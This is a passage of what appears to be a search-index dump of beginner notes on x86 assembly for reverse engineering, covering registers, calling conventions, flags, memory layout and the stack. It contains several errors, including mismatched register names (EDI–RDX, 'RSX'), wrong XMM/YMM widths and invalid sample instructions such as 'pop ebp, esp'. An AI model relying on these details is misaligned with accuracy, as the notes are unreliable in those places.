0 becomes 1). <code>NOT 1</code> <code>0</code> <code>NOT 0</code> <code>1</code> AND <code>&amp;</code> Returns 1 if both bits are 1; otherwise, returns 0. <code>1 &amp; 1</code> <code>1</code> <code>1 &amp; 0</code> <code>0</code> <code>0 &amp; 0</code> <code>0</code> OR <code>\\|</code> Returns 1 if either bit is 1; otherwise, returns 0. <code>1 \\| 1</code> <code>1</code> <code>1 \\| 0</code> <code>1</code> <code>0 \\| 0</code> <code>0</code> XOR <code>^</code> Returns 1 if only one bit is 1 (i.e., the bits are different); otherwise, returns 0. <code>1 ^ 1</code> <code>0</code> <code>1 ^ 0</code> <code>1</code> <code>0 ^ 0</code> <code>0</code>"},{"location":"Assembly/Architecture/CPU_Registers/","title":"Registers","text":"<p>Registers are for storing data. There are 8 common registers in assembly and 6 are used for general purpose. In general you could use these registers in whatever way you like but there are common conventions.</p>"},{"location":"Assembly/Architecture/CPU_Registers/#difference-between-x86-and-x86-64-registers","title":"Difference between x86 and x86-64 registers","text":"<p>What is the difference between the \"E\" and \"R\" prefixes? Besides one being a 64-bit register and the other 32 bits, the \"E\" stands for extended. The \"R\" stands for register. The \"R\" registers were newly introduced in x64, and no, you won't see them on 32-bit systems.</p>"},{"location":"Assembly/Architecture/CPU_Registers/#general-purpose","title":"General purpose","text":"Register Usage Description EAX - RAX multiplication and division Accumulator EBX - RBX General purpose Base register ECX - RCX Loop counter Counter EDX - RDX General purpose Data EDI - RDX High speed memory transfer Destination index ESI - RSX High speed memory transfer Source index"},{"location":"Assembly/Architecture/CPU_Registers/#specific-purpose","title":"Specific purpose","text":"Register Usage Description ESP - RSP Reference function parameters and local variables on the stack Stack pointer EBP - RBP A pointer to the current stack address Base pointer EIP - RIP Points to the address of the next instruction Instruction pointer"},{"location":"Assembly/Architecture/CPU_Registers/#sub-registers","title":"Sub-registers","text":"<p>The registers are 32-bits in width but can be split up into less bits. the 'E' stands for extended and is the maximum capacity of the register (32 bits).</p> 64-bit 32-bit 16-bit 8-bit 8-bit RAX EAX AX AH AL RBX EBX BX BH BL <p>For more information look at microsoft learn x64 architecture</p>"},{"location":"Assembly/Architecture/CPU_Registers/#xmm0-xmm15-and-ymm0-ymm15-registers","title":"XMM0-XMM15 and YMM0-YMM15 registers","text":"<p>Different data types can't be put in just any register. Floating-point values are represented differently than integers. Because of this, floating-point values have special registers.</p> <p>These registers include YMM0 to YMM15 (64-bit) and XMM0 to XMM15 (32-bit). The XMM registers are the lower half of the YMM registers, similar to how EAX is the lower 32 bits of RAX.</p> <p>Something unique about these registers is that they can be treated as arrays. In other words, they can hold multiple values. For example, YMM# registers are 256-bit wide each and can hold 4 64-bit values or 8 32-bit values. Similarly, the XMM# registers are 128-bits wide and can hold 2 64-bit values or 4 32-bit values.</p> <p>Special instructions are needed to utilize these registers as vectors.</p>"},{"location":"Assembly/Architecture/CPU_Registers/#segment-registers","title":"Segment registers","text":"<p>Segment Registers are 16-bit registers that convert the flat memory space into different segments for easier addressing. There are six segment registers:</p> <ul> <li>Code Segment: The Code Segment (<code>CS</code> ) register points to the Code section in the memory.</li> <li>Data Segment: The Data Segment (<code>DS</code>) register points to the program's data section in the memory.</li> <li>Stack Segment: The Stack Segment (<code>SS</code>) register points to the program's Stack in the memory.</li> <li>Extra Segments (<code>ES</code>, <code>FS</code>, and <code>GS</code>): These extra segment registers point to different data sections. These and the DS register divide the program's memory into four distinct data sections.</li> </ul>"},{"location":"Assembly/Architecture/CPU_Registers/#eflags-rflags","title":"EFLAGS &amp; RFLAGS","text":"<p>Flags are contained in a register called EFLAGS (x86) or RFLAGS (x64).</p>"},{"location":"Assembly/Architecture/CPU_Registers/#extra-registers","title":"Extra registers","text":"<p>There are additional registers that should be mentioned. These registers don't have any special uses. There are registers r8 to r15 which are designed to be used by integer type values (not floats or doubles).</p> <p>Again these can also be split up into: - R8 - 8 bytes - R8D - 4 bytes - R8W - 2 bytes - R8B - 1 byte</p>"},{"location":"Assembly/Architecture/Calling_Conventions/","title":"Calling Conventions","text":"<p>Calling conventions are the blueprint for functions within a program:</p>"},{"location":"Assembly/Architecture/Calling_Conventions/#cdecl","title":"cdecl","text":"<p>Cdecl stand for C declaration. This is the default calling convention used by most compilers for compiling C code on x86.</p> <p>Take a close look at the following example: <pre><code>//This is our function in C.\nAdd(int a, int b) { return a + b; }\n\nint main()\n{\n    Add(2, 1);\n    return 0;\n}\n</code></pre> <pre><code>main:\n    push ebp\n    mov ebp, esp\n    push 0x1\n    push 0x2\n    call Add ; return_address = main+0x54\n\nAdd:\n    push ebp\n    mov ebp, esp\n    mov eax, [ebp+0x8]\n    mov ebx, [ebp+0xC]\n    add eax, ebx\n    pop ebp\n    ret ; eip = return_address\n\nmain+0x54:\n    add esp, 0x8 ; caller stack cleanup\n    mov eax, 0x0 ; exit code\n    mov ebp, esp\n    pop ebp, esp\n    pop ebp\n    ret\n</code></pre></p> <ol> <li>Notice how the last arguments being pushed onto the stack is actually the first parameter (right to left). This is called \"Reverse Order\" and it's one of the cdecl characteristics.</li> </ol>"},{"location":"Assembly/Architecture/Calling_Conventions/#stdcall","title":"stdcall","text":"<ol> <li>arguments are pushed onto the stack in reverse order</li> </ol> <p>Mostly the same as cdecl except the ret instruction now has an operand next to it. The operands is optional and specifies how many bytes to remove from the stack.</p> <pre><code>Add:\n    push ebp\n    mov ebp, esp\n    mov eax, [ebp+0x8]\n    mov ebx, [ebp+0xC]\n    add eax, ebx\n    pop ebp\n    ret 0x8 ; callee cleanup instead of caller cleanup\n\nmain+0x54:\n    ; note: there is no caller stack cleanup\n    mov eax, 0x0 ; exit code\n    mov ebp, esp\n    pop ebp, esp\n    pop ebp\n    ret\n</code></pre>"},{"location":"Assembly/Architecture/Calling_Conventions/#fastcall","title":"fastcall","text":"<p>Fastcall has two variations: 1. fastcall    - 2-register: First two arguments are passed into registers and the rest are passed into the stack. 2. msfastcall (mainly used in 64-bit systems)    - 4-register: Four arguments are passed into registers and the rest are passed into the stack.</p> <p>Let's modify our C function to add 3 numbers togheter. <pre><code>//This is our function in C.\nAdd(int a, int b, int c) { return a + b +c; }\n\nint main()\n{\n    Add(2, 1, 0);\n    return 0;\n}\n</code></pre></p> <pre><code>main:\n    push ebp\n    mov ebp, esp\n    push 0x0        ; int c -&gt; stack\n    mov edx, 0x1    ; int b -&gt; register\n    mov ecx, 0x2    ; int a -&gt; register\n    call Add ; return_address = main+0x54\n\nAdd:\n    push ebp\n    mov ebp, esp\n    add ecx, edx\n    mov eax, [ebp-0x4]\n    add eax, ecx\n    leave\n    ret 0x4 ; callee stack cleanup\n</code></pre>"},{"location":"Assembly/Architecture/Calling_Conventions/#thiscall","title":"thiscall","text":"<p>The thiscall calling convention is used in x86 for calling C++ member functions (non-static).</p> <p>Purpose:    - Used for calling instance methods of a class.    - Passes a pointer to the instance (the this pointer) to the method.</p> <ol> <li>this pointer: Stored in the ecx register.</li> <li>Arguments: Passed on the stack, from right to left.</li> <li>Return Value: Placed in the eax register, like most x86 conventions.</li> <li>The callee cleans up the stack, similar to stdcall.</li> </ol> <pre><code>main:\n    ; Arguments pushed onto the stack in reverse order\n    push b\n    push a\n    ; `this` pointer placed in ecx\n    mov ecx, obj\n    ; Call the method\n    call method\n\nc++ member func:\n    ; Step 1: Prologue (Preserve the stack frame)\n    push ebp           ; Save the old base pointer\n    mov ebp, esp       ; Set up the new base pointer\n\n    ; Step 2: Access 'this' and arguments\n    mov eax, [ecx]     ; Access a member of the object via 'this' (ECX points to the object)\n    add eax, [ebp+8]   ; Use the first argument (a) from the stack\n    add eax, [ebp+12]  ; Use the second argument (b) from the stack\n\n    ; Step 3: Epilogue (Restore stack and return)\n    mov esp, ebp       ; Restore the stack pointer\n    pop ebp            ; Restore the old base pointer\n    ret 0x8            ; Clean up 8 bytes of arguments (2 arguments, 4 bytes each)\n</code></pre> <p>For calling conventions in x86-64 take a loot at microsoft learn x64 calling convention and its x64 ABI conventions.</p> <p>Additionally, for more info about pro- and epilogue look at microsoft learn prologue and epilogue.</p>"},{"location":"Assembly/Architecture/E_Flags/","title":"Flags","text":"<p>Flags are used to signify the result of the previously executed operation or comparison. For example, if two numbers are compared to each other the flags will reflect the results such as them being even.</p> <p>Flags are contained in a register called EFLAGS (x86) or RFLAGS (x64). There is a FLAGS register that is 16 bit.</p> <p>These flags are bits in a special register known as the <code>flags register</code> or <code>EFLAGS register</code>.</p> Flag Name Description <code>CF</code> Carry Flag Set if the last unsigned arithmetic operation carried (addition) or borrowed (subtraction) a bit beyond the register. It's also set when an operation would be negative if it wasn't for the operation being unsigned. <code>OF</code> Overflow Flag Set if a signed arithmetic operation is too big for the register to contain. <code>SF</code> Sign Flag Set if the result of an operation is negative. <code>ZF</code> Zero Flag Set if the result of an operation is zero. <code>AC</code> Adjust or Auxiliary Carry Same as the carry flag but for Binary Coded Decimal (BCD) operations. <code>PF</code> Parity Flag Set to 1 if the number of bits set in the last 8 bits is even. (10110100, PF=1; 10110101, PF=0) <code>TF</code> Trap Flag Allows for single-stepping of programs. <code>DF</code> Direction Flag <code>IF</code> Interrupt enable <p></p>"},{"location":"Assembly/Architecture/Instructions/","title":"Instructions / opcodes","text":"<p>Warning</p> <p>It's important to know that you can't study all instructions. Use an x86 instruction reference instead.</p> <ul> <li>They are executable statements</li> <li>Translated to machine language</li> <li>Executed at runtime</li> <li>The opcode is a part of the instruction that specifies the operation to be performed.</li> <li>Instructions always act from the second (source) operand into the first (destination) operand.</li> </ul>"},{"location":"Assembly/Architecture/Instructions/#syntax","title":"Syntax","text":"<p><code>[label] [opcode] [destination operand], [source operand] [;comment]</code></p> <p>Note: labels and comments are optional</p>"},{"location":"Assembly/Architecture/Instructions/#example","title":"Example","text":"<pre><code>LabelName:\n    mov eax, 10\n    mov ecx, 0\n    jmp LabelName   ;jump back to the like label &lt;-- that's a comment\n</code></pre>"},{"location":"Assembly/Architecture/Instructions/#types-of-operands","title":"Types of operands","text":"<ul> <li><code>Immediate Operands</code> can also be considered constants. These are fixed values like we had the <code>0x5f</code> in the above example.</li> <li><code>Registers</code> can also be operands. The above example shows <code>eax</code> as a register where the immediate operand is stored.</li> <li><code>Memory operands</code> are denoted by square brackets, and they reference memory locations. For example, if we see <code>[eax]</code> as an operand, it will mean that the value in eax is the memory location on which the operation has to be performed. </li> </ul>"},{"location":"Assembly/Architecture/Instructions/#mov","title":"MOV","text":"<p>Copies data from 2<sup>nd</sup> into 1<sup>st</sup> operand</p>"},{"location":"Assembly/Architecture/Instructions/#example_1","title":"Example","text":"<p><code>mov eax, ebx; Copies the value of ebx into eax</code></p>"},{"location":"Assembly/Architecture/Instructions/#add-and-sub","title":"ADD and SUB","text":"<p>Adds or subtracts data from 2<sup>nd</sup> into 1<sup>st</sup> operand. Stores the calculated value into the 1<sup>st</sup> operand.</p>"},{"location":"Assembly/Architecture/Instructions/#example_2","title":"Example","text":"<p><code>sub eax, 20;</code></p>"},{"location":"Assembly/Architecture/Instructions/#lea","title":"LEA","text":"<p>Loads the effective address from the 2<sup>nd</sup> into 1<sup>st</sup> operand. The source operand is a memory address (offset part) specified with one of the processors addressing modes; the destination operand is a general-purpose register.</p>"},{"location":"Assembly/Architecture/Instructions/#example_3","title":"Example","text":"<p><code>lea eax,[variable1]     ;use [] for dereferencing</code></p>"},{"location":"Assembly/Architecture/Instructions/#inc-and-dec","title":"INC and DEC","text":"<p>Increase or Decrease the content of the operand by 1</p>"},{"location":"Assembly/Architecture/Instructions/#example_4","title":"Example","text":"<pre><code>inc ecx\ndec ebx\n</code></pre>"},{"location":"Assembly/Architecture/Instructions/#jmp","title":"JMP","text":"<p>Jumps to a label.</p>"},{"location":"Assembly/Architecture/Instructions/#example_5","title":"Example","text":"<pre><code>start:\n    mov eax, 0\n    jmp add_10\n\nsub_20:\n    sub eax,20\n    jmp end\n\nadd_10:\n    add eax, 10\n    jmp sub_20\n\nend:\n    exit\n</code></pre>"},{"location":"Assembly/Architecture/Instructions/#cmp","title":"CMP","text":"<p>Compares the values of both operands. Acts by subtracting the operands, except the result is not stored. It only sets flags based on the comparison.</p>"},{"location":"Assembly/Architecture/Instructions/#example_6","title":"Example","text":"<p><code>cmp eax, 10</code></p>"},{"location":"Assembly/Architecture/Instructions/#condtional-jump-instructions","title":"Condtional jump instructions","text":""},{"location":"Assembly/Architecture/Instructions/#disassembly-example","title":"Disassembly example","text":"<p>When looking at it in a disassembler, we will see:</p> <pre><code>040000:    b8 5f 00 00 00    mov eax, 0x5f\n</code></pre> <ul> <li><code>040000</code>: address where the instruction is located.</li> <li><code>b8</code>: opcode of the instruction mov eax</li> <li><code>5F 00 00 00</code> indicates the other operand <code>0x5f</code>.</li> </ul> <p>Please note that due to endianness, the operand 0x5f is written as <code>5f 00 00 00</code>, which is actually <code>00 00 00 5f</code> but in <code>little-endian notation</code>.</p>"},{"location":"Assembly/Architecture/Introduction/","title":"Introduction","text":""},{"location":"Assembly/Architecture/Introduction/#what-is-assembly","title":"What is assembly?","text":"<p>Assembly is a family of low-level programming languages that are one step above machine code. Each assembly language is specific to a particular CPU architecture (e.g., x86, ARM, MIPS) and directly corresponds to the processor's instruction set.</p> <p>It is a human-readable representation of the binary instructions that a computer's processor (CPU) understands and executes. The main takeaway here being that it's a representation meaning that it's essentially the same as binary instructions.</p>"},{"location":"Assembly/Architecture/Introduction/#why-use-assembly","title":"Why use assembly?","text":"<p>Low-level languages provide direct control over hardware components making them 'closer' to the machine. It's so close to the processor that the way it's written actually resembles the way the processor processes the instructions.</p>"},{"location":"Assembly/Architecture/Introduction/#what-is-an-architecture","title":"What is an architecture?","text":"<p>In computing, architecture refers to the design and organization of a computer system, particularly the central processing unit (CPU) and its instruction set. It determines how a computer processes data, executes instructions, and communicates with memory and peripherals. Code written for one architecture won't run on another without modification.</p> <p>Key aspects of architecture: - Instruction Set Architecture or ISA - Processor word sizes - Endianness - Microarchitecture such as pipelines, cache, clock speed, etc. - Memory model - Peripheral Interfaces</p>"},{"location":"Assembly/Architecture/Introduction/#common-cpu-architecures","title":"Common CPU architecures","text":"Architecture Description Use cases x86 A complex instruction set computer architecture (CISC) used in most desktops, laptops and servers. PCs x86-64 An extension of x86 that supports 64-bit processing and larger memory addressing Modern PCs ARM A reduced instruction set computer (RISC) architecture optimized for low power and high efficiency. Smartphones, tablets, embedded systems MIPS RISC architecture commonly used in embedded systems and networking equipment. Routers, IoT devices RISC-V Open-source RISC architecture designed for flexibility and extensibility. Research, education PowerPC RISC architecture developed by IBM, used in servers and older Apple computers. High-performance computing, legacy systems"},{"location":"Assembly/Architecture/Introduction/#what-is-an-instruction-set","title":"What is an instruction set?","text":"<p>An instruction set is the collection of basic operations (instructions) that a CPU can perform. These instructions are part of the Instruction Set Architecture (ISA).</p>"},{"location":"Assembly/Architecture/Introduction/#what-are-cisc-and-risc","title":"What are CISC and RISC?","text":"<p>CISC (Complex Instruction Set Computing) and RISC (Reduced Instruction Set Computing) are two design philosophies for how instruction sets are created and executed.</p> <p>CISC designs focus on having a large set of complex instructions, where a single instruction can perform multiple low-level operations. This reduces the number of instructions a programmer needs to write but increases the complexity of the CPU.</p> <p>RISC designs focus on having a smaller set of simple instructions, where each instruction performs a single operation. This simplifies the CPU design and enables faster execution.</p>"},{"location":"Assembly/Architecture/Memory/","title":"Memory","text":"<p>You could see memory as a collection of small and large databases or containers to store our information for later processing. Every byte of memory has a unique address that allows the CPU to locate it.</p> <p>All of this memory is managed by the operating system.</p>"},{"location":"Assembly/Architecture/Memory/#types","title":"Types","text":"<p>Memory in computers is typically divided into two broad categories: volatile and non-volatile. Each serves a different purpose and operates at varying speeds and capacities.</p>"},{"location":"Assembly/Architecture/Memory/#volatile-memory","title":"Volatile memory","text":"<p>Volatile memory requires power to retain data. When the system is powered off, the data is lost. - Random access memory (RAM): emporary storage for data and instructions that the CPU is actively using.     - DRAM (Dynamic RAM): Most common type of RAM, slower but cheaper.     - SRAM (Static RAM): Faster and more expensive, used for CPU caches. - Cache: A very small, high-speed memory located inside or close to the CPU. - Registers: The fastest form of memory inside the CPU.</p>"},{"location":"Assembly/Architecture/Memory/#non-volatile-memory","title":"Non-volatile memory","text":"<ul> <li>ROM (Read-Only Memory): Permanent storage for critical data, such as the system's firmware.</li> <li>Storage (e.g., SSDs, HDDs): Long-term data storage for the operating system, applications, and user files.<ul> <li>HDD (Hard Disk Drive): Magnetic storage, slower but cheaper and durable.</li> <li>SSD (Solid State Drive): Flash-based, faster and more reliable, but more expensive per GB.</li> </ul> </li> <li>Flash Memory: Used in USB drives, SD cards, and some SSDs.</li> </ul>"},{"location":"Assembly/Architecture/Memory/#memory-hierarchy","title":"Memory Hierarchy","text":"<p>Memory in a computer system is structured as a hierarchy, based on speed, size, and proximity to the CPU:</p> Level Type Speed Capacity Proximity 1 (Fastest) Registers Fastest Very small Inside the CPU 2 Cache (L1, L2, L3) Very fast Small Near / inside the CPU 3 RAM Fast Medium Motherboard slots 4 (Slowest) Storage (SSD/HDD) Slow Large External"},{"location":"Assembly/Architecture/Memory/#how-memory-works-together","title":"How Memory Works Together","text":"<ul> <li>Registers hold immediate data for the CPU to process.</li> <li>Cache stores frequently accessed data to reduce the time needed to fetch it from RAM.</li> <li>RAM acts as a workspace for active programs and the operating system.</li> <li>Storage holds long-term data, which is loaded into RAM when needed.</li> <li>Virtual Memory (a part of storage) is used when RAM is full, though it is much slower.</li> </ul>"},{"location":"Assembly/Architecture/Memory/#programs","title":"Programs","text":"<p>As we know the operating system manages where our memory goes. For programs that need to be executed they get allocated to RAM.</p>"},{"location":"Assembly/Architecture/Memory/#data-structures","title":"Data structures","text":"<p>Data structures do essentially what the word means, they structure the data. The two main structures used in memory are the stack and the heap.</p>"},{"location":"Assembly/Architecture/Memory/#memory-layout","title":"Memory layout","text":"<p>The system's memory is organized in a specific way. This is done to make sure everything has a place to reside in.</p>"},{"location":"Assembly/Architecture/Memory/#memory-directives-or-segments","title":"Memory Directives or Segments","text":"<p>Directives are commands recognized by the compiler used for assembling the program used for different segments/sections in which data or code is stored in memory.</p> <ul> <li>NOT part of the intel instruction set. Recognized by the MASM assembler itself, rather than actual CPU instructions that the processor executes.</li> <li>DO NOT execute at runtime</li> <li>NOT case sensitive</li> </ul>"},{"location":"Assembly/Architecture/Memory/#two-main-directives","title":"Two main directives","text":"<ul> <li><code>.data</code>: Stores initialized global and static variables. Values are known at compile time. Like identifiers.</li> <li><code>.code</code>: Stores the executable instructions (program code).</li> </ul>"},{"location":"Assembly/Architecture/Memory/#other-directives","title":"Other directives","text":"<ul> <li> <p><code>.bss</code>: Stores uninitialized global and static variables. Initialized to zero at runtime.</p> </li> <li> <p><code>.stack</code>: Allocated for the runtime stack (automatic variables, function calls).</p> </li> <li> <p><code>.heap</code>: Allocated for dynamically allocated memory (e.g., malloc, new).</p> </li> </ul>"},{"location":"Assembly/Architecture/Memory/#overview-of-memory-sections","title":"Overview of Memory Sections","text":"<p>Here is a general overview of how memory is laid out in Windows. This is extremely simplified.</p> <p>In here we'll also dive just a bit deeper into how the stack and the heap are layed out in memory.</p> <p></p> <p>Warning</p> <p>The diagram above shows the direction variables (and any named data, even structures) are put into or taken out of memory. The actual data is put into memory differently. This is why stack diagrams vary so much. You'll often see stack diagrams with the stack and heap growing towards each other or high memory addresses at the top. However, this diagram is the most relevant for reverse engineering. Low addresses being at the top is also the most realistic depiction.</p>"},{"location":"Assembly/Architecture/Memory/#stack","title":"Stack","text":"<p>The stack is a region of memory located in RAM, typically near the upper end of the process's allocated memory space.</p> <p>Its specific location is determined by the operating system and hardware architecture, but it always adheres to certain principles.</p> <p>For now it's important to take note of two things: 1. When data is pushed onto the stack, the stack grows up (negatively), towards lower memory addresses. 2. When data is popped off the stack, the stack shrinks down, towards higher addresses.</p> <p>That all may seem odd but remember, it's like a normal numerical list where 1, the lower number, is at the top. 10, the higher number, is at the bottom.</p> <p>To dive deeper into how the stack works read the Call stack file.</p>"},{"location":"Assembly/Architecture/Memory/#heap","title":"Heap","text":"<p>The heap is a region of memory in RAM that is used for dynamic memory allocation, where variables or objects are created and destroyed at runtime (long-time large data objects). Unlike the stack, the heap is not managed automatically by the CPU; it is managed by the programmer or a memory manager (e.g., the operating system or language runtime).</p> <p>The heap is not really ordered in any way and can just be extended at runtime.</p> <p>Languages like C++ make you manage dynamically allocated objects yourself while other languages like C# have the CLR (Common Language Runtime) of it's .NET framework that manages this.</p> <p>The heap is typically used for data that is dynamic (changing or unpredictable). Things such as structures and user input might be stored on the heap. If the size of the data isn't known at compile-time, it's usually stored on the heap. When you add data to the heap it grows towards higher addresses.</p>"},{"location":"Assembly/Architecture/Memory/#teb","title":"TEB","text":"<p>The Thread Environment Block (TEB) stores information about the currently running thread(s).</p>"},{"location":"Assembly/Architecture/Memory/#peb","title":"PEB","text":"<p>The Process Environment Block (PEB) stores information about the process and the loaded modules. One piece of information the PEB contains is \"BeingDebugged\" which can be used to determine if the current process is being debugged.</p> <p>To read more about the PEB structure layout read microsoft learn PEB structure (winternl.h)</p>"},{"location":"Assembly/Architecture/Memory/#program-image","title":"Program image","text":"<p>This is the program/executable loaded into memory. On Windows, this is typically a Portable Executable (PE).</p>"},{"location":"Assembly/Architecture/Memory/#key-differences-between-x86-and-x86_64-directives","title":"Key Differences Between x86 and x86_64 Directives","text":"Aspect x86 (32-bit) x86-64 (64-bit) Address Space 4 GB total for all sections. Vastly larger (up to 256 TB practical). Instruction Size 32-bit instructions. 64-bit instructions, with access to more registers and addressing modes. Data Size Variables and pointers are typically 32 bits wide. Variables and pointers can be 64 bits wide. Register Access Limited to 8 general-purpose registers (EAX, EBX, etc.). Access to 16 general-purpose registers (RAX, RBX, etc.)."},{"location":"Assembly/Architecture/Operating_Modes/","title":"Modes of Operation","text":""},{"location":"Assembly/Architecture/Operating_Modes/#protective-mode","title":"Protective mode","text":"<p>The native processor state (default mode, therefor most commonly used)</p> <ul> <li>Multiple processes can run but they are each given their own section of memory</li> <li>They are forced to stay within that section of memory and can't interact with other processes memory</li> <li>Every feature is available to you and you can do anything you want to do as long as you stay within the bounds of the memory</li> </ul>"},{"location":"Assembly/Architecture/Operating_Modes/#real-address-mode","title":"Real Address mode","text":"<p>Implements early intel programming environment with the ability to switch modes.</p> <ul> <li>Allows you to directly access hardware components</li> </ul>"},{"location":"Assembly/Architecture/Operating_Modes/#system-management-mode","title":"System Management mode","text":"<p>Provides an operating system with mechanisms such as power management and security.</p> <ul> <li>Useful when designing a system that's very specific to the processor</li> </ul>"},{"location":"Assembly/Architecture/Procedures/","title":"Procedures","text":"<ul> <li>Break down large problems to smaller problems</li> <li>Like functions in other programming languages</li> <li>Receive input parameters</li> <li>Return values</li> </ul> <pre><code>MyProcedureName PROC\n    ; some instructions here\n    ret\nMyProcedureName ENDP\n</code></pre>"},{"location":"Assembly/Architecture/Sizes/","title":"Sizes / Words","text":"Type byte(s) bits BIT 0 bytes 1 bit Nibble 0 bytes 4 bits BYTE 1 byte 8 bits WORD 2 bytes 16 bits DWORD 4 bytes 32 bits QWORD 8 bytes 64 bits Paragraph 16-byte area 128 bits Kilobyte 1024 bytes Megabyte 1,048,576 bytes"},{"location":"Assembly/Architecture/Sizes/#bits","title":"Bits","text":"Bit Value 1 1 1 1 1 1 1 1 Bit Number 7 6 5 4 3 2 1 0 Position Value (Power of Base 2) 128 64 32 16 8 4 2 1"},{"location":"Assembly/Architecture/Sizes/#numeric-system","title":"Numeric system","text":"Decimal 0 1 2 3 4 5 6 7 8 9 Hex 0 1 2 3 4 5 6 7 8 9 A B C D E F"},{"location":"Assembly/Architecture/Stack/","title":"The stack","text":"<p>Refers to the logical structure used to manage function calls, consisting of stack frames.</p> <p>This section of the Memory contains local variables, arguments passed on to the program, and the return address of the parent process that called the program.</p> <p>It keeps track of all the active functions from the start of the program to the current point of execution, and handles allocation of all function parameters and local variables.</p>"},{"location":"Assembly/Architecture/Stack/#the-call-stack-segment","title":"The call stack segment","text":"<p>The stack segment refers to the physical region of memory that is allocated for the stack. This memory is used for storing all of the stack frames, including the frames used in the call stack.</p> <ul> <li>Physical Memory: The stack segment is a real, reserved memory space provided by the operating system when a process or thread is started.</li> </ul>"},{"location":"Assembly/Architecture/Stack/#lifo-data-structure","title":"Lifo data structure","text":"<p>The stack's main mechanism is that it uses a \"stack\" data structure for manipulating the data. This is a last-in, first-out (LIFO) structure. This means that the last element pushed onto the stack is the first one to be popped out. - elements get pushed onto the stack - elements get popped off of the stack</p> <p>Warning</p> <p>The stack grows negatively!</p> <p>So, the higher up you go into the stack the more negative the items become.</p> <p></p>"},{"location":"Assembly/Architecture/Stack/#a-stack-frame","title":"A stack frame","text":"<p>By default any function that you can call will create it's own \"stack frame\".</p> <p>A stack frame is an individual block of data on the call stack that is created when a function is called. Stack frames are not pushed or popped, they are not a \"real\" thing. The stack frame is simply some specific range of memory that we can put into context with a specific function. It holds all the necessary information for a specific function call, including:</p> <ul> <li>The address of the instruction beyond the function call (called the return address). This is how the program remembers where to return to after the called function exits.</li> <li>All function arguments</li> <li>Memory for any local variables</li> <li>Saved copies of any registers modified by the function that need to be restored when the function returns (E.g. EBP)</li> </ul>"},{"location":"Assembly/Architecture/Stack/#a-stack-frame-in-action","title":"A stack frame in action","text":""},{"location":"Assembly/Architecture/Stack/#prologue","title":"Prologue","text":"<p>The CPU encounters a function call and jumps to the start of a stack frame. </p> <p>At this point in time the base pointer (ebp) still points to the base of the last stack frame where this function is being called from. 1. Push the base pointer (ebp) onto the stack. 2. Move the stack pointer (esp) onto the same position as ebp. 3. Push variables we want to preserve onto the stack 4. Sub esp by a certain amount, creating room for local variables 5. Move the local variables by a certain amount (under esp)</p>"},{"location":"Assembly/Architecture/Stack/#the-function-body","title":"The function body","text":"<p>This is where the function logic happens.</p>"},{"location":"Assembly/Architecture/Stack/#epilogue","title":"Epilogue","text":"<p>When the function terminates, the following steps happen: 1. Move ebp into esp to restore the stack pointer. 2. Pop ebp to restore the caller's base pointer. 3. Return to the caller's stack frame.</p> <p></p>"},{"location":"Assembly/Architecture/Stack/#the-heap","title":"The heap","text":"<p>While on the topic of memory, let's take a look at the heap. Keep in mind, the heap is not part of the stack, this is just relevant to memory.</p> <p>The heap, also known as dynamic Memory, contains variables and data created and destroyed during program execution. When a variable is created, memory is allocated for that variable at runtime. And when that variable is deleted, the memory is freed. Hence the name dynamic memory.</p>"},{"location":"Assembly/Architecture/x86_Architecture/","title":"x86 &amp; x86_64 Architecture","text":""},{"location":"Assembly/Architecture/x86_Architecture/#components","title":"Components","text":"<ul> <li>CPU<ul> <li>ALU</li> <li>Control Unit</li> <li>Clock</li> <li>Registers</li> </ul> </li> <li>Memory</li> <li>I/O Device</li> </ul>"},{"location":"Assembly/Architecture/x86_Architecture/#communication-handling","title":"Communication handling","text":""},{"location":"Assembly/Architecture/x86_Architecture/#buses","title":"Buses","text":"<p>A bus is an engineering term for a job-specific high-speed wire. These wires are often grouped together in bundles and will transfer electrical signals either in parallel or in serial, that is many signals at once or one pulse at a time. Buses can be grouped into three functions: data buses, address buses, and control buses.</p> <p></p> <p>Buses allow us to communicate between different pieces of hardware that work on a system. - Address bus: Holds the address of the instructions in data (like a pointer) - Control bus: Helps synchronize data between every device attached to this bus - Data bus: Handles the transfers of data between attached devices</p>"},{"location":"Assembly/Architecture/x86_Architecture/#cpu-central-processing-unit","title":"CPU - Central Processing Unit","text":"<p>The CPU consists of three main components: - Control Unit (CU) - Arithmetic and Logic Unit (ALU) - Registers (Immediate Access Store)</p>"},{"location":"Assembly/Architecture/x86_Architecture/#cu-control-unit","title":"CU - Control Unit","text":"<p>Responsible for: - Controlling and monitoring the input and output of data from the computer\u2019s hardware. - Able to receive and decode instructions and direct operations to other units. - Its primary job is making sure that data is sent to the right component, at the right time, and arrives with integrity. For this it uses what's known as a \"Clock\".</p>"},{"location":"Assembly/Architecture/x86_Architecture/#a-high-frequency-clock","title":"A high frequency clock","text":"<p>The \"Clock\" switches between on (1) and off (0), it ticks at a constant rate just like a real clock. The period where the clock has been on and off once is called a cycle. The goal of this is to synchronize between the cpu and the bus (we do something every single tick).   - Measured in oscillations per second (1 GHz = 1 billion times per second).   - Sends out a regular electrical signal to all components at the same time to coordinate activities.</p>"},{"location":"Assembly/Architecture/x86_Architecture/#alu-arithmetic-and-logic-unit","title":"ALU - Arithmetic and Logic Unit","text":"<p>Carries out logic and arithmetic, completes operations like ADD, AND, OR, NOT, etc. - Arithmetic operations - Logic operations</p>"},{"location":"Assembly/Architecture/x86_Architecture/#registers","title":"Registers","text":"<p>Registers are small and limited storages, they are a type of high-speed computer memory that is very close to the CPU. It is the fastest way to store data. - They are fixed in number and size and defined in the Instruction Set Architecture (ISA).</p>"},{"location":"Assembly/Architecture/x86_Architecture/#instruction-execution-cycle","title":"Instruction execution cycle","text":"<ul> <li>The CPU completes a predefined set of steps to execute an instruction. This is called the fetch, decode &amp; execute procedure.</li> <li>Fetch an instruction (in memory) from the instruction queue</li> <li>Decode the instruction and check for operands</li> <li>If operands are involved, fetch the operands from memory / registers</li> <li>Execute the instruction and update status flags</li> <li>Store the result if required</li> </ul>"},{"location":"Assembly/Architecture/x86_Architecture/#reading-from-memory","title":"Reading from memory","text":"<ul> <li>Memory access (RAM) is slower than register access</li> <li>Each step takes approximately one clock cycle</li> <li>Place the address of the value you want to read on the address bus</li> <li>Changes the processor's RD pin (called asserting)</li> <li>Wait one clock cycle for memory to respond</li> <li> <p>Copy the data from the data bus to the destination</p> </li> <li> <p>To compare, register access usually takes only one clock cycle</p> </li> </ul>"},{"location":"Assembly/Architecture/x86_Architecture/#caching","title":"Caching","text":"<ul> <li>To reduce read/write time from memory, caches are used to store data from an address that is consistently being read from or written to. The caches are being constructed by static RAM, which is a special type of RAM 